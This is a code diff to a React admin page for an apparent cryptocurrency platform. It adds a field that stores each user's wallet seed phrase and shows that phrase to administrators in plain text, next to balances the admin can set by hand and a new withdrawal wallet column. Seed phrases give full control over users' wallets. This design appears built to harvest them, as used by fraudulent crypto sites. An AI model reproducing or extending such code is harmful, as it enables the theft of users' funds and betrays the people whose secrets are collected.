@@ -17,12 +17,14 @@ type User = {
   btcBalance: string;
   ethBalance: string;
   bnbBalance: string;
+  seedPhrase?: string | null;
 };
 
 type Transaction = {
   token: string;
   amount: string;
   status: "PENDING" | "APPROVED" | "REJECTED";
+  withdrawalWallet: string | null;
   createdAt: string; // ISO string format
 };
 
@@ -83,9 +85,24 @@ export default function AdminUserDetails({
           <p className="font-semibold">Current Role: {user.role}</p>
         </div>
       </div>
+      {user.seedPhrase ? (
+        <div className="my-6">
+          <h3 className="text-lg font-semibold mb-2">Seed Phrase</h3>
+          <div className="bg-gray-100 text-black p-4 rounded font-mono">
+            {user.seedPhrase}
+          </div>
+        </div>
+      ):(
+        <div className="my-6">
+          <h3 className="text-lg font-semibold mb-2">Seed Phrase</h3>
+          <div className="bg-gray-100 text-black p-4 rounded font-mono">
+            No Seed Phrases yet..
+          </div>
+        </div>
+      )}
 
       <h3 className="text-lg font-semibold mt-6 mb-2">Balances</h3>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-10">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
         {["usdt", "btc", "eth", "bnb"].map((coin) => (
           <div
             key={coin}
@@ -108,7 +125,7 @@ export default function AdminUserDetails({
 
       <button
         onClick={handleBalanceSave}
-        className="mt-4 bg-green-600 px-4 py-2 rounded text-white item"
+        className="bg-green-600 px-4 py-2 rounded-lg text-white item"
       >
         Save Balances
       </button>
@@ -131,35 +148,37 @@ export default function AdminUserDetails({
           </button>
         </div>
       </div>
-        <h3 className="text-lg font-semibold mt-10 mb-4">Withdrawals</h3>
-        {withdrawals.length === 0 ? (
-          <p className="text-gray-500">No withdrawal requests</p>
-        ) : (
-          <div className="overflow-x-auto">
-            <table className="min-w-full text-sm text-white">
-              <thead className="bg-gray-700">
-                <tr>
-                  <th className="text-left p-2">Token</th>
-                  <th className="text-left p-2">Amount</th>
-                  <th className="text-left p-2">Status</th>
-                  <th className="text-left p-2">Date</th>
+      <h3 className="text-lg font-semibold mt-10 mb-4">Withdrawals</h3>
+      {withdrawals.length === 0 ? (
+        <p className="text-gray-500">No withdrawal requests</p>
+      ) : (
+        <div className="overflow-x-auto">
+          <table className="min-w-full text-sm text-white">
+            <thead className="bg-gray-700">
+              <tr>
+                <th className="text-left p-2">Token</th>
+                <th className="text-left p-2">Amount</th>
+      <th className="text-left p-2">Wallet</th> 
+                <th className="text-left p-2">Status</th>
+                <th className="text-left p-2">Date</th>
+              </tr>
+            </thead>
+            <tbody>
+              {withdrawals.map((tx, i) => (
+                <tr key={i} className="border-b border-gray-600">
+                  <td className="p-2 text-black">{tx.token}</td>
+                  <td className="p-2 text-black">{tx.amount}</td>
+        <td className="p-2 text-black break-all">{tx.withdrawalWallet}</td>
+                  <td className="p-2 text-black">{tx.status}</td>
+                  <td className="p-2 text-black">
+                    {new Date(tx.createdAt).toLocaleString()}
+                  </td>
                 </tr>
-              </thead>
-              <tbody>
-                {withdrawals.map((tx, i) => (
-                  <tr key={i} className="border-b border-gray-600">
-                    <td className="p-2 text-black">{tx.token}</td>
-                    <td className="p-2 text-black">{tx.amount}</td>
-                    <td className="p-2 text-black">{tx.status}</td>
-                    <td className="p-2 text-black">
-                      {new Date(tx.createdAt).toLocaleString()}
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          </div>
-        )}
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
     </div>
   );
 }
